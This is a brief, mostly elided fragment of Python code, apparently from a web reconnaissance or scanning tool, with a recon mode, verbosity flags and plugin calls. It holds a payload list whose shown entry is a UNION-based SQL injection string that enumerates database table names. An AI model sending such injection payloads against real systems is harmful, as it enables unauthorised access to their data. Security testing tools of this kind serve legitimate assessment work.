...
Payloads = ['AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1 ', 
...
'''
def requestsAggressive(verbose):
	try:
...
if (args.recon):
	...
	if args.verbose or args.verbose2 or args.verbose3 : 
		ra = requestsAggressive(True)
	else : 
		ra = requestsAggressive(False )
	safe.safePlugins(ra)
